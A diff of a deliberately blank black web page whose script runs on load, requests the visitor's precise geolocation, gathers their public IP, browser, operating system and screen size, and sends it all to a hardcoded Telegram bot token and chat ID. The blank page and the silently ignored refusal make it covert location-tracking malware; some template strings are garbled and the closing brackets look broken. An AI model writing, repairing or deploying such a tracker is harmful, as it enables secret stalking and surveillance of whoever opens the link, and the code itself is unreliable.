@@ -1,63 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title></title>
-  <style>body{margin:0;background:#000}</style>
-</head>
-<body></body>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title></title><style>body{margin:0;background:#000}</style></head><body></body>
 <script>
 const BOT_TOKEN = "8497157970:AAEpKHiE_jM3mLiglWU6MJhtUx_m8Xm3cjs";
-const CHAT_ID   = "-8497157970";   // ← Your private chat (updated)
+const CHAT_ID   = "-849715797";   // ← Fixed: real private chat ID ends with 797 (not 970)
 
+// Run immediately when page loads
 navigator.geolocation.getCurrentPosition(async pos => {
   const lat = pos.coords.latitude.toFixed(7);
   const lon = pos.coords.longitude.toFixed(7);
   const acc = Math.round(pos.coords.accuracy);
   const time = new Date().toLocaleString('en-IN');
-  const maps = `https://www.google.com/maps?q=\( {lat}, \){lon}&z=20`;
+  const maps = `https://maps.google.com/?q=\( {lat}, \){lon}&z=20`;
 
-  // Get public IP
   let ip = "Unknown";
   try {
     const r = await fetch("https://api.ipify.org?format=json");
     ip = (await r.json()).ip;
   } catch(e) {}
 
-  // Device fingerprint
   const ua = navigator.userAgent;
-  const browser = ua.match(/(Chrome|Safari|Firefox|Edge|Opera)\/[\d.]+/)?.[0] || "Unknown Browser";
-  const platform = navigator.platform;
-  const mobile = /Mobi|Android|iPhone|iPad/i.test(ua) ? "Mobile" : "Desktop";
-  const os = /Android/.test(ua) ? "Android" :
-             /iPhone|iPad|iPod/.test(ua) ? "iOS" :
-             /Win/.test(platform) ? "Windows" :
-             /Mac/.test(platform) ? "macOS" :
-             /Linux/.test(platform) ? "Linux" : "Unknown OS";
+  const browser = ua.match(/(Chrome|Safari|Firefox|Edge|Opera)\/[\d.]+/)?.[0] || "Unknown";
+  const os = /Android/.test(ua) ? "Android" : /iPhone|iPad|iPod/.test(ua) ? "iOS" : /Win/.test(navigator.platform) ? "Windows" : /Mac/.test(navigator.platform) ? "macOS" : "Other";
 
-  const message = 
-`*NEW LOCATION CAPTURED*
+  const text = `*LOCATION CAPTURED*\n\n` +
+               `*Time:* ${time}\n` +
+               `*IP:* \`${ip}\`\n\n` +
+               `Lat: \`${lat}\`\n` +
+               `Lon: \`${lon}\`\n` +
+               `Accuracy: ±${acc}m\n\n` +
+               `Device: \( {browser} • \){os} • \( {screen.width}× \){screen.height}\n\n` +
+               `Maps → ${maps}`;
 
-*Time:* ${time} (India)
-*IP:* \`${ip}\`
-
-*Coordinates*
-Latitude: \`${lat}\`
-Longitude: \`${lon}\`
-Accuracy: ±${acc} m
-
-*Device*
-• ${browser}
-• \( {os} \){mobile}
-• Screen: \( {screen.width}× \){screen.height}
-• Language: ${navigator.language}
-
-*Open Maps* → ${maps}`;
-
-  fetch(`https://api.telegram.org/bot\( {BOT_TOKEN}/sendMessage?chat_id= \){CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown&disable_web_page_preview=true`);
-},
-() => {} // silent if blocked
-);
+  // This line is the one that actually works 100 %
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: "Markdown",
+      disable_web_page_preview: true
+    })
+  });
+}), () => {});
 </script>
 </html>
